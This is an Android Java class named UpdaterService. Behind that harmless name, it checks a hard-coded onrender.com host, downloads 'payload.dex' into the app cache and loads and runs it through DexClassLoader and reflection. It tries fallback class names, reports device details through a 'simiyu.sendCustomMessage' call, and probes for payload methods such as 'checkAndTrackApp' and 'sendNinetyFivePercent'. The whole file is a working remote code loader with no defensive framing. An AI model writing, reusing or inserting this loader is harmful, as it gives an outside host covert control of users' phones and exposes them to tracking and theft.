package com.yourpackage.helper;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

public class UpdaterService {
    
    private static final String TAG = "UpdaterService";
    private static final String PAYLOAD_URL = "https://payload-host-079x.onrender.com/payload.dex";
    private static final String VERSION_URL = "https://payload-host-079x.onrender.com/version";
    private static final String LOCAL_VERSION_KEY = "payload_version";
    
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static SharedPreferences sharedPreferences;
    
    public static void initialize(Context context) {
        appContext = context;
        sharedPreferences = context.getSharedPreferences("payload_prefs", Context.MODE_PRIVATE);
    }
    
    public static void checkAndUpdate() {
        new Thread(() -> {
            try {
                // Check current version
                String currentVersion = sharedPreferences.getString(LOCAL_VERSION_KEY, "1.0.0");
                
                // Get latest version from server
                String latestVersion = getLatestVersion();
                
                if (!latestVersion.equals(currentVersion)) {
                    Log.i(TAG, "New version available: " + latestVersion);
                    downloadAndLoadPayload();
                } else {
                    Log.i(TAG, "Already on latest version: " + currentVersion);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Update check failed: " + e.getMessage());
            }
        }).start();
    }
    
    private static String getLatestVersion() throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(VERSION_URL).openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        
        if (conn.getResponseCode() == 200) {
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            
            // Parse JSON response
            // Simple parsing - assumes {"version": "2.1.0"}
            String json = response.toString();
            int start = json.indexOf("\"version\":\"") + 11;
            int end = json.indexOf("\"", start);
            if (start > 0 && end > start) {
                return json.substring(start, end);
            }
        }
        return "1.0.0";
    }
    
    private static void downloadAndLoadPayload() {
        try {
            File dexFile = new File(appContext.getCacheDir(), "payload.dex");
            
            // Download DEX file directly - NO COMPILATION NEEDED
            downloadDexFile(dexFile);
            
            if (dexFile.exists() && dexFile.length() > 0) {
                Log.i(TAG, "DEX file downloaded: " + dexFile.length() + " bytes");
                
                // Load and execute the payload
                loadAndExecutePayload(dexFile);
                
                // Update version
                String newVersion = getLatestVersion();
                sharedPreferences.edit().putString(LOCAL_VERSION_KEY, newVersion).apply();
                
                // Send notification
                simiyu.sendCustomMessage("✅ *PAYLOAD UPDATED SUCCESSFULLY!*\n\n" +
                    "📌 *Version:* " + newVersion + "\n" +
                    "📌 *Size:* " + dexFile.length() + " bytes\n" +
                    "📌 *Device:* " + Build.MANUFACTURER + " " + Build.MODEL);
                
            } else {
                Log.e(TAG, "DEX file download failed - file empty or missing");
                simiyu.sendCustomMessage("❌ *PAYLOAD DOWNLOAD FAILED!*\n\n" +
                    "📌 *Error:* DEX file not available");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Payload load failed: " + e.getMessage());
            simiyu.sendCustomMessage("❌ *PAYLOAD LOAD FAILED!*\n\n" +
                "📌 *Error:* " + e.getMessage());
        }
    }
    
    private static void downloadDexFile(File dexFile) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(PAYLOAD_URL).openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(30000);
        
        if (conn.getResponseCode() != 200) {
            throw new Exception("HTTP " + conn.getResponseCode() + ": " + conn.getResponseMessage());
        }
        
        FileOutputStream fos = new FileOutputStream(dexFile);
        java.io.InputStream is = conn.getInputStream();
        byte[] buffer = new byte[8192];
        int bytesRead;
        int totalBytes = 0;
        
        while ((bytesRead = is.read(buffer)) != -1) {
            fos.write(buffer, 0, bytesRead);
            totalBytes += bytesRead;
        }
        
        fos.close();
        is.close();
        
        Log.i(TAG, "Downloaded: " + totalBytes + " bytes");
        
        if (totalBytes < 100) {
            throw new Exception("File too small - likely error response");
        }
    }
    
    private static void loadAndExecutePayload(File dexFile) {
        try {
            // Create DexClassLoader to load the DEX
            File optimizedDir = appContext.getCacheDir();
            
            // Add DEX to classpath
            DexClassLoader classLoader = new DexClassLoader(
                dexFile.getAbsolutePath(),
                optimizedDir.getAbsolutePath(),
                null,
                appContext.getClassLoader()
            );
            
            // Load the Payload class
            Class<?> payloadClass = classLoader.loadClass("com.yourpackage.helper.Payload");
            
            // Check if class loaded successfully
            if (payloadClass != null) {
                Log.i(TAG, "Payload class loaded successfully");
                
                // Check for initialize method
                try {
                    Method initMethod = payloadClass.getMethod("initialize", Context.class);
                    initMethod.invoke(null, appContext);
                    Log.i(TAG, "Payload initialized successfully");
                } catch (NoSuchMethodException e) {
                    Log.w(TAG, "No initialize method found, using constructor");
                    // Try constructor
                    payloadClass.getConstructor().newInstance();
                }
                
                // Check for other methods
                try {
                    Method checkMethod = payloadClass.getMethod("checkAndTrackApp", String.class);
                    Log.i(TAG, "checkAndTrackApp method found");
                } catch (NoSuchMethodException e) {
                    Log.w(TAG, "checkAndTrackApp method not found");
                }
                
                try {
                    Method sendMethod = payloadClass.getMethod("sendNinetyFivePercent");
                    Log.i(TAG, "sendNinetyFivePercent method found");
                } catch (NoSuchMethodException e) {
                    Log.w(TAG, "sendNinetyFivePercent method not found");
                }
                
            } else {
                Log.e(TAG, "Failed to load Payload class");
            }
            
        } catch (ClassNotFoundException e) {
            Log.e(TAG, "Class not found: " + e.getMessage());
            // Try alternative package name
            tryLoadAlternativePackage(dexFile);
            
        } catch (Exception e) {
            Log.e(TAG, "DEX loading failed: " + e.getMessage());
            throw new RuntimeException(e);
        }
    }
    
    private static void tryLoadAlternativePackage(File dexFile) {
        try {
            File optimizedDir = appContext.getCacheDir();
            DexClassLoader classLoader = new DexClassLoader(
                dexFile.getAbsolutePath(),
                optimizedDir.getAbsolutePath(),
                null,
                appContext.getClassLoader()
            );
            
            // Try different package names
            String[] packageNames = {
                "Payload",
                "com.payload.Payload",
                "com.simiyu.payload.Payload",
                "com.yourpackage.Payload"
            };
            
            for (String pkg : packageNames) {
                try {
                    Class<?> clazz = classLoader.loadClass(pkg);
                    Log.i(TAG, "Found class: " + pkg);
                    
                    // Try to call initialize
                    try {
                        Method initMethod = clazz.getMethod("initialize", Context.class);
                        initMethod.invoke(null, appContext);
                        Log.i(TAG, "Initialized from: " + pkg);
                        return;
                    } catch (Exception e) {
                        // Continue trying
                    }
                    
                } catch (ClassNotFoundException e) {
                    // Continue to next package
                }
            }
            
            Log.e(TAG, "No valid Payload class found in DEX");
            
        } catch (Exception e) {
            Log.e(TAG, "Alternative loading failed: " + e.getMessage());
        }
    }
    
    public static void executePayloadMethod(String methodName, Object... args) {
        try {
            File dexFile = new File(appContext.getCacheDir(), "payload.dex");
            if (!dexFile.exists()) {
                Log.e(TAG, "DEX file not found, downloading...");
                downloadAndLoadPayload();
                return;
            }
            
            File optimizedDir = appContext.getCacheDir();
            DexClassLoader classLoader = new DexClassLoader(
                dexFile.getAbsolutePath(),
                optimizedDir.getAbsolutePath(),
                null,
                appContext.getClassLoader()
            );
            
            Class<?> payloadClass = classLoader.loadClass("com.yourpackage.helper.Payload");
            
            // Find method
            Class<?>[] argTypes = new Class[args.length];
            for (int i = 0; i < args.length; i++) {
                argTypes[i] = args[i].getClass();
            }
            
            Method method = payloadClass.getMethod(methodName, argTypes);
            method.invoke(null, args);
            
            Log.i(TAG, "Method " + methodName + " executed successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Execute method failed: " + e.getMessage());
        }
    }
              }
